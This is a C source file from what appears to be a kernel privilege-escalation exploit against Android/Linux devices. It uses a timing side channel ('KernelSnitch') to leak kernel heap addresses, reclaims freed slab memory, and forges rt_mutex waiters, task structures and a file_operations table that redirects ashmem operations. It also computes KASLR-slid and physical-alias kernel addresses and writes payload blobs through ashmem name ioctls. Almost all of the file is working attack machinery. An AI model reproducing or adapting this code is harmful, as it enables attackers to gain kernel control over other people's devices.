#include "common.h"
#include "kernelsnitch/kernelsnitch.h"

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
static int reclaim_sv[2] = {-1, -1};
#if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
    APP_CONTROLLED_MM_GROUP_RECLAIM
static int controlled_reclaim_sv[S918_RECLAIM_SOCKET_PAIRS - 1][2];
static size_t controlled_reclaim_count;
#endif
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
#if !defined(APP_CONTROLLED_MM_GROUP_RECLAIM) || \
    !APP_CONTROLLED_MM_GROUP_RECLAIM
static pid_t child_leak;
#endif

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
static int rmg_fast_profile_enabled(void) {
#if defined(APP_DEFAULT_FAST_KSNITCH) && APP_DEFAULT_FAST_KSNITCH
  return 1;
#else
  const char *value = getenv("RMG_FAST");
  return value && *value && strcmp(value, "0") != 0;
#endif
}

static size_t rmg_profile_env_size(const char *name, size_t fallback,
                                   size_t min, size_t max) {
  const char *value = getenv(name);
  if (!value || !*value) {
    return fallback;
  }

  char *end = NULL;
  errno = 0;
  unsigned long long parsed = strtoull(value, &end, 0);
  if (errno || end == value || *end || parsed < min || parsed > max) {
    pr_warning("ignoring invalid %s=%s\n", name, value);
    return fallback;
  }
  return (size_t)parsed;
}

static void configure_kernelsnitch_profile(
    struct kernelsnitch_shared_state *state, int payload_mode) {
  size_t appended_futexes = APPENDED_FUTEXES;
  size_t repeat_measurement = REPEAT_MEASUREMENT;
  size_t average = AVERAGE;

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_KSNITCH_APPENDED_FUTEXES)
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    appended_futexes = SLIDE_KSNITCH_APPENDED_FUTEXES;
    repeat_measurement = SLIDE_KSNITCH_REPEAT_MEASUREMENT;
    average = SLIDE_KSNITCH_AVERAGE;
  }

  /*
   * Collision measurement dominates the wall time on E2S.  FAST keeps the
   * collision count, confirmation count and exact address search unchanged;
   * it only uses the shorter measurement profile already proven by the slide
   * consumer.  Explicit variables make hardware A/B testing possible without
   * producing a new payload for every sample count.
   */
  if (rmg_fast_profile_enabled()) {
    appended_futexes = SLIDE_KSNITCH_APPENDED_FUTEXES;
    if (repeat_measurement > 32) {
      repeat_measurement = 32;
    }
    if (average > 4) {
      average = 4;
    }
  }
#endif

  appended_futexes = rmg_profile_env_size(
      "RMG_KSNITCH_APPENDED", appended_futexes, 256, 4096);
  repeat_measurement = rmg_profile_env_size(
      "RMG_KSNITCH_REPEAT", repeat_measurement, 8, REPEAT_MEASUREMENT);
  average = rmg_profile_env_size(
      "RMG_KSNITCH_AVERAGE", average, 1, repeat_measurement);
  if (average > repeat_measurement) {
    average = repeat_measurement;
  }

  kernelsnitch_set_profile(state, appended_futexes, repeat_measurement,
                           average);
  pr_info("KernelSnitch profile mode=%d fast=%d appended=%zu repeat=%zu "
          "average=%zu\n",
          payload_mode, rmg_fast_profile_enabled(), appended_futexes,
          repeat_measurement, average);
}

static void log_mm_slabinfo(const char *stage) {
  if (!getenv("SLUB_DIAG")) {
    return;
  }

  FILE *fp = fopen("/proc/slabinfo", "re");
  if (!fp) {
    pr_warning("mm slabinfo stage=%s open errno=%d\n", stage, errno);
    return;
  }

  char line[512];
  int found = 0;
  while (fgets(line, sizeof(line), fp)) {
    if (strncmp(line, "mm_struct ", strlen("mm_struct ")) != 0) {
      continue;
    }
    pr_info("mm slabinfo stage=%s %s", stage, line);
    found = 1;
    break;
  }
  fclose(fp);
  if (!found) {
    pr_warning("mm slabinfo stage=%s entry missing\n", stage);
  }
}

#endif

#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
static void touch_mm_slabinfo(void) {
  FILE *fp = fopen("/proc/slabinfo", "re");
  if (!fp) {
    return;
  }
  char line[512];
  unsigned long values[8];
  while (fgets(line, sizeof(line), fp)) {
    if (memcmp(line, "mm_struct ", 10)) {
      continue;
    }
    sscanf(line,
           "mm_struct %lu %lu %lu %lu %lu : tunables %*lu %*lu %*lu : slabdata %lu %lu %lu",
           &values[0], &values[1], &values[2], &values[3], &values[4],
           &values[5], &values[6], &values[7]);
    break;
  }
  fclose(fp);
}
#endif

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_P0_OFFSET_CANDIDATES)
static const uintptr_t slide_bank_offsets[] = {
  SLIDE_P0_OFFSET_CANDIDATES
};
static uintptr_t slide_bank_payload_base;
static uintptr_t slide_bank_parents[SLIDE_BANK_SLOTS];
static uintptr_t slide_bank_targets[SLIDE_BANK_SLOTS];
static size_t slide_bank_lock_off = SLIDE_BANK_LOCK_OFF;
static size_t slide_bank_task_off = SLIDE_BANK_TASK_OFF;

#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
    defined(SLIDE_S928_BANK_TASK_STRIDE)
#define ACTIVE_SLIDE_BANK_TASK_STRIDE SLIDE_S928_BANK_TASK_STRIDE
#else
#define ACTIVE_SLIDE_BANK_TASK_STRIDE SLIDE_BANK_TASK_STRIDE
#endif

static uintptr_t slide_bank_lock_owner(uintptr_t task) {
#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
    defined(SLIDE_S928_BANK_LOCK_OWNER_TASK) && \
    SLIDE_S928_BANK_LOCK_OWNER_TASK
  return task | 1;
#else
  (void)task;
  return SLIDE_LOCK_OWNER_VALUE;
#endif
}

#if !(defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
      defined(SLIDE_S928_TASK_OFF_CANDIDATES))
_Static_assert(
    SLIDE_BANK_TASK_OFF + (SLIDE_BANK_SLOTS - 1) *
                              ACTIVE_SLIDE_BANK_TASK_STRIDE +
            FAKE_TASK_PI_BLOCKED_ON_OFF + sizeof(uint64_t) <=
        SLIDE_BANK_LOCK_OFF,
    "slide task bank overlaps lock bank");
#endif
_Static_assert(
    SLIDE_BANK_LOCK_OFF + (SLIDE_BANK_SLOTS - 1) * SLIDE_BANK_SLOT_STRIDE +
            SLIDE_BANK_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <=
        ORDER3_SIZE,
    "slide lock bank exceeds reclaimed page");
#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
    defined(SLIDE_S928_BANK_LOCK_BASE)
_Static_assert(
    SLIDE_S928_BANK_LOCK_BASE +
            (SLIDE_S928_BANK_LOCK_MAX_BUCKET <<
             SLIDE_S928_BANK_LOCK_SHIFT) +
            (SLIDE_BANK_SLOTS - 1) * SLIDE_BANK_SLOT_STRIDE +
            SLIDE_BANK_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <=
        ORDER3_SIZE,
    "S928 slide lock bank exceeds reclaimed page");
#endif
#if defined(APP_FOPS_TABLE_MIRROR_OFF)
_Static_assert(
    APP_FOPS_TABLE_MIRROR_OFF + 0x110 <= FOPS_TABLE_OFF,
    "mirrored FOPS table overlaps primary FOPS table");
#endif

static int configure_slide_bank_geometry(uintptr_t leaked,
                                         int payload_mode) {
  slide_bank_lock_off = SLIDE_BANK_LOCK_OFF;
  slide_bank_task_off = SLIDE_BANK_TASK_OFF;
#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
    defined(SLIDE_S928_BANK_LOCK_BASE)
  size_t bucket =
      (leaked >> SLIDE_S928_BANK_LOCK_SHIFT) &
      SLIDE_S928_BANK_LOCK_BUCKET_MASK;
  if (bucket > SLIDE_S928_BANK_LOCK_MAX_BUCKET) {
    pr_warning("S928 lock bucket rejected=%zu max=%d mode=%d\n", bucket,
               SLIDE_S928_BANK_LOCK_MAX_BUCKET, payload_mode);
    return 0;
  }
  slide_bank_lock_off =
      SLIDE_S928_BANK_LOCK_BASE +
      (bucket << SLIDE_S928_BANK_LOCK_SHIFT);

#if defined(SLIDE_S928_TASK_OFF_CANDIDATES) && \
    defined(FOPS_S928_TASK_OFF_CANDIDATES)
  static const size_t slide_task_candidates[] = {
    SLIDE_S928_TASK_OFF_CANDIDATES
  };
  static const size_t fops_task_candidates[] = {
    FOPS_S928_TASK_OFF_CANDIDATES
  };
  const size_t *candidates = fops_task_candidates;
  size_t candidate_count =
      sizeof(fops_task_candidates) / sizeof(fops_task_candidates[0]);
  size_t task_span = FAKE_TASK_PI_BLOCKED_ON_OFF + sizeof(uint64_t);
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    candidates = slide_task_candidates;
    candidate_count =
        sizeof(slide_task_candidates) / sizeof(slide_task_candidates[0]);
    task_span += (SLIDE_BANK_SLOTS - 1) * ACTIVE_SLIDE_BANK_TASK_STRIDE;
  }
  size_t lock_span = (SLIDE_BANK_SLOTS - 1) * SLIDE_BANK_SLOT_STRIDE +
                     SLIDE_BANK_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE;
  slide_bank_task_off = 0;
  for (size_t i = 0; i < candidate_count; i++) {
    size_t candidate = candidates[i];
    if (candidate + task_span > ORDER3_SIZE) {
      continue;
    }
    if (candidate + task_span <= slide_bank_lock_off ||
        slide_bank_lock_off + lock_span <= candidate) {
      slide_bank_task_off = candidate;
      break;
    }
  }
  if (!slide_bank_task_off) {
    pr_warning("S928 task bank unavailable bucket=%zu lock=0x%zx mode=%d\n",
               bucket, slide_bank_lock_off, payload_mode);
    return 0;
  }
#endif
  pr_info("S928 bank bucket=%zu lock=0x%zx task=0x%zx mode=%d\n", bucket,
          slide_bank_lock_off, slide_bank_task_off, payload_mode);
#else
  (void)leaked;
  (void)payload_mode;
#endif
  return 1;
}
#endif

uintptr_t page_base;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;
uintptr_t binwrite_target;
uintptr_t slide_p0_offset;
uintptr_t slide_oracle_parent;
uintptr_t slide_oracle_target;
uintptr_t p0_gate_page_struct;
uintptr_t p0_probe_page_struct;
#if !defined(APP_REQUIRE_FRESH_P0_SESSION) || !APP_REQUIRE_FRESH_P0_SESSION
uintptr_t fops_data_probe_addr;
int fops_data_probe_active;
int data_alias_uses_slide = 1;
#endif
int data_addr_canonical;
char ashmem_path[256] = "/dev/ashmem";

__attribute__((weak)) void app_publish_writer_started(void) {
}

__attribute__((weak)) void app_publish_slide_ready(void) {
}

void put_fake_waiter(unsigned char *payload, size_t waiter_off,
                            uintptr_t tree_parent, uintptr_t tree_right,
                            uintptr_t tree_left, uintptr_t pi_parent,
                            uintptr_t pi_right, uintptr_t pi_left,
                            uintptr_t task, uintptr_t lock,
                            uint32_t priority) {
  put64(payload, waiter_off + 0x00, tree_parent);
  put64(payload, waiter_off + 0x08, tree_right);
  put64(payload, waiter_off + 0x10, tree_left);
#if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
        pi_parent);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, pi_right);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, pi_left);
  put64(payload, waiter_off + FAKE_WAITER_TASK_OFF, task);
  put64(payload, waiter_off + FAKE_WAITER_LOCK_OFF, lock);
#if COMPACT_RT_MUTEX_WAITER
  put32(payload, waiter_off + FAKE_WAITER_WAKE_STATE_OFF, 0);
#endif
  put32(payload, waiter_off + FAKE_WAITER_PRIO_OFF, priority);
  put64(payload, waiter_off + FAKE_WAITER_DEADLINE_OFF, 0);
#if COMPACT_RT_MUTEX_WAITER
  put64(payload, waiter_off + FAKE_WAITER_WW_CTX_OFF, 0);
#endif
#else
  put32(payload, waiter_off + FAKE_WAITER_TREE_PRIO_OFF, priority);
  put64(payload, waiter_off + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
        pi_parent);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, pi_right);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, pi_left);
  put32(payload, waiter_off + FAKE_WAITER_PI_TREE_PRIO_OFF, priority);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
  put64(payload, waiter_off + FAKE_WAITER_TASK_OFF, task);
  put64(payload, waiter_off + FAKE_WAITER_LOCK_OFF, lock);
  put32(payload, waiter_off + FAKE_WAITER_WAKE_STATE_OFF, 0);
  put64(payload, waiter_off + FAKE_WAITER_WW_CTX_OFF, 0);
#endif
}

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_P0_OFFSET_CANDIDATES)
int select_slide_payload_slot(uintptr_t offset) {
  if (!slide_bank_payload_base) {
    return 0;
  }
  for (size_t i = 0;
       i < sizeof(slide_bank_offsets) / sizeof(slide_bank_offsets[0]); i++) {
    if (slide_bank_offsets[i] != offset) {
      continue;
    }
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
    return select_slide_payload_index(1);
#else
    return select_slide_payload_index(i);
#endif
  }
  return 0;
}

int select_slide_payload_index(size_t index) {
  if (!slide_bank_payload_base || index >= SLIDE_BANK_SLOTS) {
    return 0;
  }
  fake_task = slide_bank_payload_base + slide_bank_task_off +
              index * ACTIVE_SLIDE_BANK_TASK_STRIDE;
  fake_lock = slide_bank_payload_base + slide_bank_lock_off +
              index * SLIDE_BANK_SLOT_STRIDE;
  fake_w0 = fake_lock + SLIDE_BANK_WAITER_OFF;
  slide_oracle_parent = slide_bank_parents[index];
  slide_oracle_target = slide_bank_targets[index];
  return 1;
}

#if !defined(APP_CLOSED_FOPS_ROUTE) || !APP_CLOSED_FOPS_ROUTE
static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
                                 size_t slot, uintptr_t parent,
                                 uintptr_t target) {
  size_t task_off =
      slide_bank_task_off + slot * ACTIVE_SLIDE_BANK_TASK_STRIDE;
  size_t lock_off = slide_bank_lock_off + slot * SLIDE_BANK_SLOT_STRIDE;
  size_t waiter_off = lock_off + SLIDE_BANK_WAITER_OFF;
  uintptr_t task = payload_base + task_off;
  uintptr_t lock = payload_base + lock_off;
  uintptr_t waiter = payload_base + waiter_off;
  uintptr_t pi_right = 0;
  uintptr_t pi_left = target;
  uintptr_t lock_owner = slide_bank_lock_owner(task);
  uintptr_t waiter_task = task;
  uintptr_t task_group = 0;
  uintptr_t pi_waiters = waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF;
  uintptr_t pi_top_task = task;
  uint32_t waiter_prio = SLIDE_FAKE_WAITER_PRIO;

#if defined(P0_ORACLE_PRODUCTION_SLOT)
  if (slot == P0_ORACLE_PRODUCTION_SLOT) {
#if defined(APP_PRODUCTION_SLOT_PI_RIGHT) && \
    APP_PRODUCTION_SLOT_PI_RIGHT
    pi_right = target;
    pi_left = 0;
#elif defined(APP_PRODUCTION_SLOT_PROVEN_LEFT) && \
    APP_PRODUCTION_SLOT_PROVEN_LEFT
    /* Use the child direction proven by the exact gate/probe/restore writes. */
    pi_right = 0;
    pi_left = target;
#endif
#if defined(APP_PRODUCTION_SLOT_FULL_FOPS_GEOMETRY) && \
    APP_PRODUCTION_SLOT_FULL_FOPS_GEOMETRY
    /* Match the established non-banked PAGE_PAYLOAD_FOPS construction. */
    lock_owner = task | 1;
    waiter_task = text_addr(INIT_TASK);
    task_group = text_addr(ROOT_TASK_GROUP);
    pi_waiters = 0;
    pi_top_task = text_addr(INIT_TASK);
    waiter_prio = FAKE_WAITER_PRIO;
#endif
  }
#endif

  put32(p, lock_off + 0x00, 0);
  put64(p, lock_off + 0x08, waiter);
  put64(p, lock_off + 0x10, waiter);
  put64(p, lock_off + 0x18, lock_owner);
  put_fake_waiter(p, waiter_off, 1, 0, 0, parent, pi_right, pi_left,
                  waiter_task, lock, waiter_prio);
  put32(p, task_off + FAKE_TASK_USAGE_OFF, 0x100);
  put32(p, task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
  put32(p, task_off + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
  put64(p, task_off + FAKE_TASK_TASK_GROUP_OFF, task_group);
  put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
  put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF, pi_waiters);
  put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08, pi_waiters);
  put64(p, task_off + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
  put64(p, task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
}
#endif
#endif

void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
      KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
  configure_kernelsnitch_profile(ks, PAGE_PAYLOAD_SLIDE);
#else
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  kernelsnitch_set_profile(
      ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
      SLIDE_KSNITCH_REPEAT_MEASUREMENT,
      SLIDE_KSNITCH_AVERAGE);
#endif
#endif
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

void run_kernelsnitch_bruteforce(void) {
  kernelsnitch_bruteforce(ks);
}

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
static uintptr_t canonicalize_kernelsnitch_pointer(uintptr_t leaked) {
#if KERNELSNITCH_MTE_ENABLED
  if (leaked != (uintptr_t)-1) {
    uintptr_t tagged = leaked;
    leaked |= 0xff00000000000000ULL;
    pr_info("KernelSnitch mm_struct tagged=%016zx untagged=%016zx\n",
            tagged, leaked);
  }
#endif
  return leaked;
}
#endif

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  return canonicalize_kernelsnitch_pointer(leaked);
#else
  return leaked;
#endif
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  const char *stack_writer = "pselect";
  const char *reclaim = "legacy";
  const char *fops_route = "bank";
  const char *pipe_order = "before-fops";
#if defined(SLIDE_STACK_WRITER) && \
    defined(SLIDE_STACK_WRITER_MCAST) && \
    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_MCAST
  stack_writer = "mcast";
#elif defined(SLIDE_STACK_WRITER) && \
      defined(SLIDE_STACK_WRITER_SIGRETURN) && \
      SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
  stack_writer = "sigreturn";
#endif
#if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
    APP_CONTROLLED_MM_GROUP_RECLAIM
  reclaim = "controlled";
#endif
#if defined(APP_CLOSED_FOPS_ROUTE) && APP_CLOSED_FOPS_ROUTE
  fops_route = "direct";
#endif
#if defined(APP_FOPS_BEFORE_PIPE) && APP_FOPS_BEFORE_PIPE
  pipe_order = "after-fops";
#endif
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), geteuid(), attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s stack_writer=%s reclaim=%s fops=%s pipe=%s\n",
             getpid(), BUILD_VARIANT_LABEL, stack_writer, reclaim,
             fops_route, pipe_order);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)P0_KERNEL_PHYS_LOAD,
             (unsigned long long)P0_KERNEL_PHYS_DELTA,
             (unsigned long long)SLIDE_NFULNL_LOGGER_NAME,
             (unsigned long long)SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = SCHED_BATCH;
  attr.sched_nice = nice_value;
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

int try_cache_ashmem_path(const char *path) {
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  close(fd);
  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
  return 1;
}

int same_rdev_path(const char *path, dev_t rdev) {
  struct stat st;
  if (stat(path, &st) != 0) {
    return 0;
  }
  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
}

void init_ashmem_path(void) {
  char boot_id[128];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
    close(fd);
    if (n > 0) {
      boot_id[n] = 0;
      boot_id[strcspn(boot_id, "\r\n")] = 0;

      char path[256];
      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
      if (try_cache_ashmem_path(path)) {
        return;
      }
    }
  }

  struct stat base;
  int have_base = stat("/dev/ashmem", &base) == 0;
  have_base = have_base && S_ISCHR(base.st_mode);
  DIR *dir = opendir("/dev");
  if (dir && have_base) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
          strcmp(de->d_name, "ashmem") == 0) {
        continue;
      }

      char path[256];
      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
      if (same_rdev_path(path, base.st_rdev) &&
          try_cache_ashmem_path(path)) {
        closedir(dir);
        return;
      }
    }
  }
  if (dir) {
    closedir(dir);
  }
}

int open_ashmem_device(void) {
  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
}

uintptr_t data_direct_addr(uintptr_t image_addr) {
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  uintptr_t address = p0_data_alias(image_addr);
  return data_alias_uses_slide ? address + slide_p0_offset : address;
#else
  return p0_data_alias(image_addr) + slide_p0_offset;
#endif
}

uintptr_t data_addr(uintptr_t image_addr) {
  return data_addr_canonical ? text_addr(image_addr)
                             : data_direct_addr(image_addr);
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t slide_canon_addr(uintptr_t data_alias) {
  return kaslr_base + p0_alias_image_offset(data_alias);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return text_addr(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put_fake_fops_table(unsigned char *p, size_t off) {
  put64(p, off + FOPS_OWNER_OFF, 0);
  put64(p, off + FOPS_LLSEEK_OFF,
        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
  put64(p, off + FOPS_READ_OFF, 0);
  put64(p, off + FOPS_WRITE_OFF, 0);
  put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
  put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
  put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
}

int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < pos; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }

  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 &&
        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(1);
    }
    kernelsnitch_find_collisions(ks);
    exit(0);
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
#if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
    APP_CONTROLLED_MM_GROUP_RECLAIM
  for (size_t pair = 0; pair < controlled_reclaim_count; ++pair) {
    for (size_t side = 0; side < 2; ++side) {
      if (controlled_reclaim_sv[pair][side] >= 0) {
        close(controlled_reclaim_sv[pair][side]);
        controlled_reclaim_sv[pair][side] = -1;
      }
    }
  }
  controlled_reclaim_count = 0;
#endif
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

int reclaim_receiver_fd(void) {
  return reclaim_sv[1];
}

